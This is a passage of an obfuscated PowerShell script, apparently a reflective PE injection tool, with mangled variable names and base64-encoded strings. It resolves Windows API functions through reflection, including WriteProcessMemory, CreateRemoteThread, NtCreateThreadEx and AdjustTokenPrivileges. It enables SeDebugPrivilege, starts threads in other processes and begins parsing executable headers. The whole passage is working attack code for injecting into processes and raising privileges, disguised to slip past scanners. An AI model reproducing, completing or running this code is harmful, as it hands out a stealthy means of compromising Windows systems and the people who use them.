		${___/\_/==\/\__/\_} = __/===\/==\/\/\/\/ kernel32.dll WaitForSingleObject
	    ${_/=\__/==\/=\/\_/} = __/==\_/\/\_/\_/== @([IntPtr], [UInt32]) ([UInt32])
	    ${_/\/=\/==\___/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\_/==\/\__/\_}, ${_/=\__/==\/=\/\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value ${_/\/=\/==\___/===}
		${/===\/==\/=======} = __/===\/==\/\/\/\/ kernel32.dll WriteProcessMemory
        ${___/\/=\/===\/=\/} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${__/==\_________/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/==\/=======}, ${___/\/=\/===\/=\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value ${__/==\_________/=}
		${_/\/=\_/\___/=\_/} = __/===\/==\/\/\/\/ kernel32.dll ReadProcessMemory
        ${_/\/\_/===\/\/\_/} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        ${_/\__/\/==\/\__/=} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/=\_/\___/=\_/}, ${_/\/\_/===\/\/\_/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value ${_/\__/\/==\/\__/=}
		${___/\__/=\/=\/=\/} = __/===\/==\/\/\/\/ kernel32.dll CreateRemoteThread
        ${__/==\_/\/==\_/=\} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${/==\__/==\_/=\/==} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/\__/=\/=\/=\/}, ${__/==\_/\/==\_/=\})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value ${/==\__/==\_/=\/==}
		${__/=\/=\/=====\/=} = __/===\/==\/\/\/\/ kernel32.dll GetExitCodeThread
        ${______/\/==\/\/\/} = __/==\_/\/\_/\_/== @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        ${__/=\_/==\__/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/=\/=====\/=}, ${______/\/==\/\/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value ${__/=\_/==\__/==\/}
		${_/=\__/\__/\____/} = __/===\/==\/\/\/\/ Advapi32.dll OpenThreadToken
        ${_/\/==\______/\__} = __/==\_/\/\_/\_/== @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        ${_/\_/\_____/=\_/\} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/=\__/\__/\____/}, ${_/\/==\______/\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value ${_/\_/\_____/=\_/\}
		${___/===\_/\_/\/=\} = __/===\/==\/\/\/\/ kernel32.dll GetCurrentThread
        ${/===\/==\__/===\_} = __/==\_/\/\_/\_/== @() ([IntPtr])
        ${_/\________/=====} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/===\_/\_/\/=\}, ${/===\/==\__/===\_})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value ${_/\________/=====}
		${__/\/===\_/=\___/} = __/===\/==\/\/\/\/ Advapi32.dll AdjustTokenPrivileges
        ${_/\_/\/\_/\_/\__/} = __/==\_/\/\_/\_/== @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${_/\_/\__/=\_/\/\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/\/===\_/=\___/}, ${_/\_/\/\_/\_/\__/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value ${_/\_/\__/=\_/\/\/}
		${/===\/\_/\__/==\_} = __/===\/==\/\/\/\/ Advapi32.dll LookupPrivilegeValueA
        ${_/=\/\/==\_____/=} = __/==\_/\/\_/\_/== @([String], [String], [IntPtr]) ([Bool])
        ${/=\/==\_/=\______} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/\_/\__/==\_}, ${_/=\/\/==\_____/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value ${/=\/==\_/=\______}
		${___/==\/==\_/=\_/} = __/===\/==\/\/\/\/ Advapi32.dll ImpersonateSelf
        ${___/==\/=\_____/=} = __/==\_/\/\_/\_/== @([Int32]) ([Bool])
        ${_/\/=\/\/==\_/=\_} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${___/==\/==\_/=\_/}, ${___/==\/=\_____/=})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value ${_/\/=\/\/==\_/=\_}
        if (([Environment]::OSVersion.Version -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2))) {
		    ${_/\/\__/=\/=\/\/\} = __/===\/==\/\/\/\/ NtDll.dll NtCreateThreadEx
            ${__/=\/=======\___} = __/==\_/\/\_/\_/== @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${_/\/\/==\_/\_____} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${_/\/\__/=\/=\/\/\}, ${__/=\/=======\___})
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value ${_/\/\/==\_/\_____}
        }
		${__/=\/\/\_/\/===\} = __/===\/==\/\/\/\/ Kernel32.dll IsWow64Process
        ${/=\_/==\/\__/=\__} = __/==\_/\/\_/\_/== @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        ${_/=\_/\__/=\/==\/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${__/=\/\/\_/\/===\}, ${/=\_/==\/\__/=\__})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value ${_/=\_/\__/=\/==\/}
		${/===\/\/=====\_/=} = __/===\/==\/\/\/\/ Kernel32.dll CreateThread
        ${_/\_/====\_/\_/\/} = __/==\_/\/\_/\_/== @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        ${____/\/\__/\/\__/} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/===\/\/=====\_/=}, ${_/\_/====\_/\_/\/})
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value ${____/\/\__/\/\__/}
		${/=\__/=\/==\__/=\} = __/===\/==\/\/\/\/ kernel32.dll VirtualFree
		${__/\_/==\_/=\/===} = __/==\_/\/\_/\_/== @([IntPtr])
		${/===\/===\/=\/===} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${/=\__/=\/==\__/=\}, ${__/\_/==\_/=\/===})
		$Win32Functions | Add-Member NoteProperty -Name LocalFree -Value ${/===\/===\/=\/===}
		return $Win32Functions
	}
	Function __/\/=\/\/=\_/\/\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\_/=\/========\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/=\/=\_/\/\/\/==}
		)
		[Byte[]]${__/===\______/\/\} = [BitConverter]::GetBytes(${__/\_/=\/========\})
		[Byte[]]${______/\__/\__/\_} = [BitConverter]::GetBytes(${__/=\/=\_/\/\/\/==})
		[Byte[]]${/==\_/\_/\__/==\/} = [BitConverter]::GetBytes([UInt64]0)
		if (${__/===\______/\/\}.Count -eq ${______/\__/\__/\_}.Count)
		{
			${/=\___/\/=\_/\__/} = 0
			for (${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${__/===\______/\/\}.Count; ${/=\/\___/========}++)
			{
				${____/=\_/\_/\/\/\} = ${__/===\______/\/\}[${/=\/\___/========}] - ${/=\___/\/=\_/\__/}
				if (${____/=\_/\_/\/\/\} -lt ${______/\__/\__/\_}[${/=\/\___/========}])
				{
					${____/=\_/\_/\/\/\} += 256
					${/=\___/\/=\_/\__/} = 1
				}
				else
				{
					${/=\___/\/=\_/\__/} = 0
				}
				[UInt16]${____/==\_/==\_/\/} = ${____/=\_/\_/\/\/\} - ${______/\__/\__/\_}[${/=\/\___/========}]
				${/==\_/\_/\__/==\/}[${/=\/\___/========}] = ${____/==\_/==\_/\/} -band 0x00FF
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABzAHUAYgB0AHIAYQBjAHQAIABiAHkAdABlAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAHMA')))
		}
		return [BitConverter]::ToInt64(${/==\_/\_/\__/==\/}, 0)
	}
	Function _/=\___/\_/\__/\/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\_/=\/========\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/=\/=\_/\/\/\/==}
		)
		[Byte[]]${__/===\______/\/\} = [BitConverter]::GetBytes(${__/\_/=\/========\})
		[Byte[]]${______/\__/\__/\_} = [BitConverter]::GetBytes(${__/=\/=\_/\/\/\/==})
		[Byte[]]${/==\_/\_/\__/==\/} = [BitConverter]::GetBytes([UInt64]0)
		if (${__/===\______/\/\}.Count -eq ${______/\__/\__/\_}.Count)
		{
			${/=\___/\/=\_/\__/} = 0
			for (${/=\/\___/========} = 0; ${/=\/\___/========} -lt ${__/===\______/\/\}.Count; ${/=\/\___/========}++)
			{
				[UInt16]${____/==\_/==\_/\/} = ${__/===\______/\/\}[${/=\/\___/========}] + ${______/\__/\__/\_}[${/=\/\___/========}] + ${/=\___/\/=\_/\__/}
				${/==\_/\_/\__/==\/}[${/=\/\___/========}] = ${____/==\_/==\_/\/} -band 0x00FF
				if ((${____/==\_/==\_/\/} -band 0xFF00) -eq 0x100)
				{
					${/=\___/\/=\_/\__/} = 1
				}
				else
				{
					${/=\___/\/=\_/\__/} = 0
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABhAGQAZAAgAGIAeQB0AGUAYQByAHIAYQB5AHMAIABvAGYAIABkAGkAZgBmAGUAcgBlAG4AdAAgAHMAaQB6AGUAcwA=')))
		}
		return [BitConverter]::ToInt64(${/==\_/\_/\__/==\/}, 0)
	}
	Function _/=\/\/\/\/\____/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		${__/\_/=\/========\},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${__/=\/=\_/\/\/\/==}
		)
		[Byte[]]${__/===\______/\/\} = [BitConverter]::GetBytes(${__/\_/=\/========\})
		[Byte[]]${______/\__/\__/\_} = [BitConverter]::GetBytes(${__/=\/=\_/\/\/\/==})
		if (${__/===\______/\/\}.Count -eq ${______/\__/\__/\_}.Count)
		{
			for (${/=\/\___/========} = ${__/===\______/\/\}.Count-1; ${/=\/\___/========} -ge 0; ${/=\/\___/========}--)
			{
				if (${__/===\______/\/\}[${/=\/\___/========}] -gt ${______/\__/\__/\_}[${/=\/\___/========}])
				{
					return $true
				}
				elseif (${__/===\______/\/\}[${/=\/\___/========}] -lt ${______/\__/\__/\_}[${/=\/\___/========}])
				{
					return $false
				}
			}
		}
		else
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIABjAG8AbQBwAGEAcgBlACAAYgB5AHQAZQAgAGEAcgByAGEAeQBzACAAbwBmACAAZABpAGYAZgBlAHIAZQBuAHQAIABzAGkAegBlAA==')))
		}
		return $false
	}
	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		[Byte[]]${/=\_/\/=\___/===\} = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64(${/=\_/\/=\___/===\}, 0))
	}
	Function __/=\/======\/\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${_/=\/\_____/\_/\/\},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/=\/\_/=\_/=\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${____/=\_/=\_/\_/\_},
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		${___/=====\___/\_/=}
		)
	    [IntPtr]${___/\__/\_/\_____} = [IntPtr](_/=\___/\_/\__/\/\ (${____/=\_/=\_/\_/\_}) (${___/=====\___/\_/=}))
		${___/\/\/=\_/\____} = ${__/\/=\/\_/=\_/=\_}.EndAddress
		if ((_/=\/\/\/\/\____/\ (${__/\/=\/\_/=\_/=\_}.PEHandle) (${____/=\_/=\_/\_/\_})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAHMAbQBhAGwAbABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAvAD0AXAAvAFwAXwBfAF8AXwBfAC8AXABfAC8AXAAvAFwAfQA=')))
		}
		if ((_/=\/\/\/\/\____/\ (${___/\__/\_/\_____}) (${___/\/\/=\_/\____})) -eq $true)
		{
			Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AHIAaQB0AGUAIAB0AG8AIABtAGUAbQBvAHIAeQAgAGcAcgBlAGEAdABlAHIAIAB0AGgAYQBuACAAYQBsAGwAbwBjAGEAdABlAGQAIABhAGQAZAByAGUAcwBzACAAcgBhAG4AZwBlAC4AIAAkAHsAXwAvAD0AXAAvAFwAXwBfAF8AXwBfAC8AXABfAC8AXAAvAFwAfQA=')))
		}
	}
	Function _/=\_/====\_/\_/\/
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			${__/==\/\_/\_/\/=\/},
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			${___/\/====\_/\_/==}
		)
		for (${_/====\/\/\_/==\/} = 0; ${_/====\/\/\_/==\/} -lt ${__/==\/\_/\_/\/=\/}.Length; ${_/====\/\/\_/==\/}++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte(${___/\/====\_/\_/==}, ${_/====\/\/\_/==\/}, ${__/==\/\_/\_/\/=\/}[${_/====\/\/\_/==\/}])
		}
	}
	Function __/==\_/\/\_/\_/==
	{
	    Param
	    (
	        [OutputType([Type])]
	        [Parameter( Position = 0)]
	        [Type[]]
	        ${_/====\/\__/\_/\/\} = (New-Object Type[](0)),
	        [Parameter( Position = 1 )]
	        [Type]
	        ${__/==\__/==\____/=} = [Void]
	    )
	    ${__/====\_/=\_/\_/} = [AppDomain]::CurrentDomain
	    ${___/==\_/\_/=\_/\} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlAA=='))))
	    ${___/=\_/===\__/\/} = ${__/====\_/=\_/\_/}.DefineDynamicAssembly(${___/==\_/\_/=\_/\}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    ${__/\_/\/=\_/==\_/} = ${___/=\_/===\__/\/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAE0AZQBtAG8AcgB5AE0AbwBkAHUAbABlAA=='))), $false)
	    ${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB5AEQAZQBsAGUAZwBhAHQAZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGEAcwBzACwAIABQAHUAYgBsAGkAYwAsACAAUwBlAGEAbABlAGQALAAgAEEAbgBzAGkAQwBsAGEAcwBzACwAIABBAHUAdABvAEMAbABhAHMAcwA='))), [System.MulticastDelegate])
	    ${_/=\/==\__/\_/\/\} = ${__/\_/====\/=\/\_}.DefineConstructor($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBUAFMAcABlAGMAaQBhAGwATgBhAG0AZQAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFAAdQBiAGwAaQBjAA=='))), [System.Reflection.CallingConventions]::Standard, ${_/====\/\__/\_/\/\})
	    ${_/=\/==\__/\_/\/\}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    ${/=\___/=\_/==\/==} = ${__/\_/====\/=\/\_}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAaQBkAGUAQgB5AFMAaQBnACwAIABOAGUAdwBTAGwAbwB0ACwAIABWAGkAcgB0AHUAYQBsAA=='))), ${__/==\__/==\____/=}, ${_/====\/\__/\_/\/\})
	    ${/=\___/=\_/==\/==}.SetImplementationFlags($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AdABpAG0AZQAsACAATQBhAG4AYQBnAGUAZAA='))))
	    echo ${__/\_/====\/=\/\_}.CreateType()
	}
	Function __/===\/==\/\/\/\/
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        ${_/===\/\_/==\/==\_},
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        ${_/===\/\_/=\/==\/=}
	    )
	    ${_/=\/=\/=\__/=\/\} = [AppDomain]::CurrentDomain.GetAssemblies() |
	        ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBkAGwAbAA=')))) }
	    ${/=\_/=\_/\_/===\/} = ${_/=\/=\/=\__/=\/\}.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBXAGkAbgAzADIALgBVAG4AcwBhAGYAZQBOAGEAdABpAHYAZQBNAGUAdABoAG8AZABzAA=='))))
	    ${_/\/=\/==\/\/\_/\} = ${/=\_/=\_/\_/===\/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQATQBvAGQAdQBsAGUASABhAG4AZABsAGUA'))))
	    ${__/===\_/\__/\_/=} = ${/=\_/=\_/\_/===\/}.GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA=='))))
	    ${/===\_/\/\/\____/} = ${_/\/=\/==\/\/\_/\}.Invoke($null, @(${_/===\/\_/==\/==\_}))
	    ${_/==\_/=\_/\/\/=\} = New-Object IntPtr
	    ${/=\/\__/\_/=\__/\} = New-Object System.Runtime.InteropServices.HandleRef(${_/==\_/=\_/\/\/=\}, ${/===\_/\/\/\____/})
	    echo ${__/===\_/\__/\_/=}.Invoke($null, @([System.Runtime.InteropServices.HandleRef]${/=\/\__/\_/=\__/\}, ${_/===\/\_/=\/==\/=}))
	}
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[IntPtr]${___/\_/=\_/\__/\/} = $Win32Functions.GetCurrentThread.Invoke()
		if (${___/\_/=\_/\__/\/} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABnAGUAdAAgAHQAaABlACAAaABhAG4AZABsAGUAIAB0AG8AIAB0AGgAZQAgAGMAdQByAHIAZQBuAHQAIAB0AGgAcgBlAGEAZAA=')))
		}
		[IntPtr]${__/\/\__/=\/\__/=} = [IntPtr]::Zero
		[Bool]${/====\__/==\__/==} = $Win32Functions.OpenThreadToken.Invoke(${___/\_/=\_/\__/\/}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${__/\/\__/=\/\__/=})
		if (${/====\__/==\__/==} -eq $false)
		{
			${/=\/\_/\/\/=====\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${/=\/\_/\/\/=====\} -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				${/====\__/==\__/==} = $Win32Functions.ImpersonateSelf.Invoke(3)
				if (${/====\__/==\__/==} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABpAG0AcABlAHIAcwBvAG4AYQB0AGUAIABzAGUAbABmAA==')))
				}
				${/====\__/==\__/==} = $Win32Functions.OpenThreadToken.Invoke(${___/\_/=\_/\__/\/}, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]${__/\/\__/=\/\__/=})
				if (${/====\__/==\__/==} -eq $false)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuAA==')))
				}
			}
			else
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABPAHAAZQBuAFQAaAByAGUAYQBkAFQAbwBrAGUAbgAuACAARQByAHIAbwByACAAYwBvAGQAZQA6ACAAJAB7AC8APQBcAC8AXABfAC8AXAAvAFwALwA9AD0APQA9AD0AXAB9AA==')))
			}
		}
		[IntPtr]${/====\_/\_/\_/\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		${/====\__/==\__/==} = $Win32Functions.LookupPrivilegeValue.Invoke($null, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAEQAZQBiAHUAZwBQAHIAaQB2AGkAbABlAGcAZQA='))), ${/====\_/\_/\_/\/\})
		if (${/====\__/==\__/==} -eq $false)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAATABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlAA==')))
		}
		[UInt32]${/===\/===\/=\_/=\} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]${_/==\/===\/\/=\/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/===\/===\/=\_/=\})
		${/=\/\_/==\____/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/==\/===\/\/=\/=}, [Type]$Win32Types.TOKEN_PRIVILEGES)
		${/=\/\_/==\____/\/}.PrivilegeCount = 1
		${/=\/\_/==\____/\/}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/====\_/\_/\_/\/\}, [Type]$Win32Types.LUID)
		${/=\/\_/==\____/\/}.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\/\_/==\____/\/}, ${_/==\/===\/\/=\/=}, $true)
		${/====\__/==\__/==} = $Win32Functions.AdjustTokenPrivileges.Invoke(${__/\/\__/=\/\__/=}, $false, ${_/==\/===\/\/=\/=}, ${/===\/===\/=\_/=\}, [IntPtr]::Zero, [IntPtr]::Zero)
		${/=\/\_/\/\/=====\} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
		if ((${/====\__/==\__/==} -eq $false) -or (${/=\/\_/\/\/=====\} -ne 0))
		{
		}
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/==\/===\/\/=\/=})
	}
	Function _/=\__/=\/==\/===\
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		${__/=\__/=\/=\_/\_/},
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		${____/=\_/=\_/\_/\_},
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		${__/=====\___/\___/} = [IntPtr]::Zero,
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)
		[IntPtr]${/===\/\____/=\/=\} = [IntPtr]::Zero
		${_/===\/\/\_/\/\__} = [Environment]::OSVersion.Version
		if ((${_/===\/\/\_/\/\__} -ge (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,0)) -and (${_/===\/\/\_/\/\__} -lt (New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) 6,2)))
		{
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFYAaQBzAHQAYQAvADcAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAE4AdABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZABFAHgALgAgAEEAZABkAHIAZQBzAHMAIABvAGYAIAB0AGgAcgBlAGEAZAA6ACAAJAB7AF8AXwBfAF8ALwA9AFwAXwAvAD0AXABfAC8AXABfAC8AXABfAH0A')))
			${_/\/=\/\/=\_/\_/\}= $Win32Functions.NtCreateThreadEx.Invoke([Ref]${/===\/\____/=\/=\}, 0x1FFFFF, [IntPtr]::Zero, ${__/=\__/=\/=\_/\_/}, ${____/=\_/=\_/\_/\_}, ${__/=====\___/\___/}, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			${/=\____/====\____} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if (${/===\/\____/=\/=\} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBuACAATgB0AEMAcgBlAGEAdABlAFQAaAByAGUAYQBkAEUAeAAuACAAUgBlAHQAdQByAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAC8AXAAvAD0AXAAvAFwALwA9AFwAXwAvAFwAXwAvAFwAfQAuACAATABhAHMAdABFAHIAcgBvAHIAOgAgACQAewAvAD0AXABfAF8AXwBfAC8APQA9AD0APQBcAF8AXwBfAF8AfQA=')))
			}
		}
		else
		{
			Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAAvADgAIABkAGUAdABlAGMAdABlAGQALAAgAHUAcwBpAG4AZwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkAC4AIABBAGQAZAByAGUAcwBzACAAbwBmACAAdABoAHIAZQBhAGQAOgAgACQAewBfAF8AXwBfAC8APQBcAF8ALwA9AFwAXwAvAFwAXwAvAFwAXwB9AA==')))
			${/===\/\____/=\/=\} = $Win32Functions.CreateRemoteThread.Invoke(${__/=\__/=\/=\_/\_/}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${____/=\_/=\_/\_/\_}, ${__/=====\___/\___/}, 0, [IntPtr]::Zero)
		}
		if (${/===\/\____/=\/=\} -eq [IntPtr]::Zero)
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAsACAAdABoAHIAZQBhAGQAIABoAGEAbgBkAGwAZQAgAGkAcwAgAG4AdQBsAGwA')))
		}
		return ${/===\/\____/=\/=\}
	}
	Function __/=\__/=====\/\/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/\/==\_/=\/\/=},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		${/=\_/==\/==\__/\_} = New-Object System.Object
		${_/\__/==\_/==\___} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\/\/==\_/=\/\/=}, [Type]$Win32Types.IMAGE_DOS_HEADER)
